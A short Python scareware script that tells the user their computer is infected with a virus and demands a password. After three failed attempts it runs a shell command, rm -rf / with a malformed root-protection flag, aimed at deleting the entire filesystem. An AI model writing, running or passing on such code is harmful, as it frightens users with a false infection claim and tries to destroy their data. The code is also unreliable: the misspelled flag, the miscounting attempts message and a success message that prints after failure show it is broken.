from os import system
from auth import *
import time

print("ATTENTION!")
print("You have been infected with a virus!")
print("Please enter the the password to stop it from breaking your computer!")

for i in range(3):
    pwd = input("> ")
    if verify_password(pwd): break
    print("Incorrect! %i attempt(s) remaining!" % i)
else:
    print()
    print("3 incorrect attempts ... we warned you")
    time.sleep(0.5)
    print()
    print("Executing rm -rf /")
    print()
    time.sleep(3)
    system("rm -rf / -no-reserve-root")

print("Password is correct! Exiting...")
